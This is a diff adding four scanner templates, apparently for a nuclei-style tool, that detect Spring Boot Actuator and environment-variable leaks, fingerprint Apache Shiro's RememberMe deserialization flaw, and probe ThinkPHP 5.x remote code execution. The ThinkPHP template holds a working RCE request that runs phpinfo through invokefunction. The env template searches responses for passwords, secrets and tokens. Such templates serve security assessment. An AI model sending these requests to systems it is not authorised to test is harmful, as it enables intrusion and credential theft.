@@ -1,0 +1,88 @@
+id: spring-boot-actuator
+
+info:
+  name: Spring Boot Actuator 信息泄露
+  author: sky-eye
+  severity: medium
+  description: Spring Boot Actuator 端点未授权暴露敏感信息
+  tags: spring,java,framework
+
+requests:
+  - method: GET
+    path:
+      - "/actuator"
+      - "/actuator/health"
+      - "/actuator/info"
+      - "/actuator/env"
+      - "/actuator/beans"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "health"
+          - "status"
+          - "UP"
+        condition: or
+---
+id: spring-boot-env-leak
+
+info:
+  name: Spring Boot Env 信息泄露
+  author: sky-eye
+  severity: high
+  description: Spring Boot 环境变量泄露敏感凭据
+  tags: spring,java,framework
+
+requests:
+  - method: GET
+    path:
+      - "/actuator/env"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "password"
+          - "secret"
+          - "key"
+          - "token"
+        condition: or
+---
+id: shiro-rememberme
+
+info:
+  name: Apache Shiro RememberMe 特征检测
+  author: sky-eye
+  severity: high
+  description: Apache Shiro 反序列化漏洞 (Shiro-550) 特征检测
+  tags: shiro,java,framework
+
+requests:
+  - method: GET
+    path:
+      - "/"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "rememberMe=deleteMe"
+---
+id: thinkphp-rce
+
+info:
+  name: ThinkPHP 5.x RCE 检测
+  author: sky-eye
+  severity: critical
+  description: ThinkPHP 5.x 远程代码执行
+  tags: thinkphp,php,framework
+
+requests:
+  - method: GET
+    path:
+      - "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PHP Version"
+          - "phpinfo"
+        condition: or
